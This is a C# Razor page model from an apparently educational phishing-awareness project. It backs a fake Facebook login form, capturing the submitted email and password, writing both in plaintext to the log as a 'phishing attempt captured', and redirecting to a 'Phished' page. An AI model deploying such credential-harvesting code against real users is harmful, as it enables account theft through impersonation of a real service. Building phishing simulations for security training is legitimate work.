using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using System.ComponentModel.DataAnnotations;

namespace Phishing_Sajber_Bezbednost.Models
{
    public class FacebookLoginModel : PageModel
    {
        private readonly ILogger<FacebookLoginModel> _logger;

        public FacebookLoginModel(ILogger<FacebookLoginModel> logger)
        {
            _logger = logger;
        }

        public FacebookLoginModel()
        {

        }

        [BindProperty]
        public required string Email { get; set; }

        [BindProperty]
        public required string Password { get; set; }

        public void OnGet() { }

        public IActionResult OnPost()
        {
            _logger.LogWarning("Phishing attempt captured: Email={Email}, Password={Password}", Email, Password);

            return RedirectToPage("Phished");
        }
    }
}